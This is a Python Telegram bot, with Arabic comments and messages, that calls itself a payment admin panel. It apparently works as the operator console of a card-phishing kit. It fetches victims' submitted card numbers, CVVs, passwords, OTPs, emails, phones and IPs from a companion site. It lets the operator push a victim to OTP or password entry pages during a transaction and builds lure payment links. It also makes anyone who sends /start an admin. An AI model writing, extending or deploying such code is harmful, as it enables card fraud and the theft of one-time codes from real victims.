import os
import requests
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

load_dotenv()

BOT_TOKEN = os.getenv('BOT_TOKEN')
WEBSITE_URL = os.getenv('WEBSITE_URL', 'http://localhost:5000')

# قائمة الأدمنز
ADMIN_IDS = set()

# قاعدة بيانات العملاء
customers = {}

def send_message(chat_id, text, buttons=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "reply_markup": buttons}
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error: {e}")

def update_payment_status(payment_id, status):
    try:
        requests.post(f"{WEBSITE_URL}/api/update_status", json={"payment_id": payment_id, "status": status}, timeout=5)
    except Exception as e:
        print(f"Error: {e}")

def request_otp(payment_id):
    try:
        requests.post(f"{WEBSITE_URL}/api/request_otp", json={"payment_id": payment_id}, timeout=5)
    except Exception as e:
        print(f"Error: {e}")

def request_password(payment_id):
    try:
        requests.post(f"{WEBSITE_URL}/api/request_password", json={"payment_id": payment_id}, timeout=5)
    except Exception as e:
        print(f"Error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # أي شخص يبعت /start يصير أدمن
    if user.id not in ADMIN_IDS:
        ADMIN_IDS.add(user.id)
        await update.message.reply_text(
            f"🎉 <b>تم تسجيلك كأدمن!</b>\n\n"
            f"👤 الاسم: {user.first_name}\n"
            f"🆔 الـ ID: <code>{user.id}</code>\n\n"
            f"من الآن رح تستقبل إشعارات الدفع هنا.",
            parse_mode='HTML'
        )
        await show_menu(update, context)
        return

    # إذا هو الأدمن
    if user.id in ADMIN_IDS:
        await show_menu(update, context)
    else:
        await update.message.reply_text("🚫 هذا البوت مخصص للإدارة فقط.")

async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📊 جميع المدفوعات", callback_data="all")],
        [InlineKeyboardButton("⏳ قيد الانتظار", callback_data="pending")],
        [InlineKeyboardButton("✅ المقبولة", callback_data="approved")],
        [InlineKeyboardButton("❌ المرفوضة", callback_data="rejected")]
    ]
    await update.message.reply_text(
        "🔧 <b>لوحة تحكم الأدمن</b>\n\nاختر من القائمة:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def send_payment_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """بعت رابط الدفع للعميل"""
    user = update.effective_user
    
    # إذا مش أدمن، بعت رسالة
    if user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 غير مصرح!")
        return
    
    # إذا مافي args، بعت تعليمات
    if not context.args:
        await update.message.reply_text(
            "📋 <b>كيف تبعت رابط الدفع:</b>\n\n"
            "استخدم: /paylink [المبلغ]\n"
            "مثال: /paylink 100\n\n"
            "العميل رح يستقبل رابط الدفع مباشرة.",
            parse_mode='HTML'
        )
        return
    
    amount = context.args[0]
    
    # إنشاء رابط دفع مخصص
    payment_link = f"{WEBSITE_URL}?amount={amount}"
    
    await update.message.reply_text(
        f"🔗 <b>رابط الدفع جاهز!</b>\n\n"
        f"💰 المبلغ: ${amount}\n"
        f"🔗 الرابط: {payment_link}\n\n"
        f"بعت الرابط للعميل.",
        parse_mode='HTML'
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await query.edit_message_text("🚫 غير مصرح!")
        return

    data = query.data

    if data.startswith("accept_"):
        pid = data.replace("accept_", "")
        update_payment_status(pid, "approved")
        await query.edit_message_text(f"✅ تم قبول الدفع: <code>{pid}</code>", parse_mode='HTML')

    elif data.startswith("reject_"):
        pid = data.replace("reject_", "")
        update_payment_status(pid, "rejected")
        await query.edit_message_text(f"❌ تم رفض الدفع: <code>{pid}</code>", parse_mode='HTML')

    elif data.startswith("request_otp_"):
        pid = data.replace("request_otp_", "")
        request_otp(pid)
        await query.edit_message_text(
            f"📱 تم طلب OTP لـ: <code>{pid}</code>\n\n"
            f"العميل رح يرى صفحة إدخال الرمز الآن",
            parse_mode='HTML'
        )

    elif data.startswith("request_pass_"):
        pid = data.replace("request_pass_", "")
        request_password(pid)
        await query.edit_message_text(
            f"🔑 تم طلب كلمة السر لـ: <code>{pid}</code>\n\n"
            f"العميل رح يرى صفحة إدخال كلمة السر الآن",
            parse_mode='HTML'
        )

    elif data.startswith("view_"):
        pid = data.replace("view_", "")
        try:
            res = requests.get(f"{WEBSITE_URL}/api/all", timeout=5)
            all_payments = res.json()
            payment = all_payments.get(pid, {})
        except:
            payment = {}

        if not payment:
            await query.edit_message_text("❌ العملية غير موجودة!")
            return

        status = payment.get('status', 'pending')
        text = (
            f"📋 <b>تفاصيل العملية</b>\n\n"
            f"🆔 <code>{pid}</code>\n"
            f"💳 <code>{payment.get('card_number', 'N/A')}</code>\n"
            f"👤 {payment.get('card_holder', 'N/A')}\n"
            f"📅 {payment.get('expiry_month', 'N/A')}/{payment.get('expiry_year', 'N/A')}\n"
            f"🔒 CVV: <code>{payment.get('cvv', 'N/A')}</code>\n"
            f"🔑 كلمة السر: <code>{payment.get('password', 'N/A')}</code>\n"
            f"📱 OTP: <code>{payment.get('otp', 'N/A')}</code>\n"
            f"💰 {payment.get('amount', '0')} {payment.get('currency', 'USD')}\n"
            f"📧 {payment.get('email', 'N/A')}\n"
            f"📱 {payment.get('phone', 'N/A')}\n"
            f"🌐 <code>{payment.get('ip', 'N/A')}</code>\n"
            f"⏰ {payment.get('timestamp', 'N/A')}\n"
            f"📊 الحالة: <b>{status}</b>"
        )

        keyboard = []
        if status == 'pending':
            keyboard = [
                [InlineKeyboardButton("✅ قبول الدفع", callback_data=f"accept_{pid}"),
                 InlineKeyboardButton("❌ رفض الدفع", callback_data=f"reject_{pid}")],
                [InlineKeyboardButton("🔑 طلب OTP", callback_data=f"request_otp_{pid}"),
                 InlineKeyboardButton("🔒 طلب كلمة سر", callback_data=f"request_pass_{pid}")]
            ]
        keyboard.append([InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back")])

        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

    elif data in ["all", "pending", "approved", "rejected"]:
        try:
            res = requests.get(f"{WEBSITE_URL}/api/all", timeout=5)
            all_payments = res.json()
        except:
            all_payments = {}

        filtered = {k: v for k, v in all_payments.items() if data == "all" or v.get('status') == data}

        if not filtered:
            await query.edit_message_text(f"📭 لا توجد مدفوعات في هذا القسم!")
            return

        text = f"📋 <b>المدفوعات ({len(filtered)})</b>\n\n"
        keyboard = []
        for pid, p in list(filtered.items())[:10]:
            emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌", "needs_otp": "📱", "needs_password": "🔒"}.get(p.get('status'), "⏳")
            text += f"{emoji} <code>{pid[:10]}...</code> - ${p.get('amount', '0')}\n"
            keyboard.append([InlineKeyboardButton(f"{emoji} {pid[:8]}... ${p.get('amount', '0')}", callback_data=f"view_{pid}")])

        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back")])
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

    elif data == "back":
        await show_menu(update, context)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("paylink", send_payment_link))
    app.add_handler(CallbackQueryHandler(callback_handler))
    print("🤖 Bot started! Send /start to become admin.")
    print("💡 Use /paylink [amount] to send payment link to customers.")
    PORT = int(os.environ.get("PORT", 10000))
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
    app.run_webhook(listen="0.0.0.0", port=PORT, webhook_url=WEBHOOK_URL)

if __name__ == '__main__':
    main()
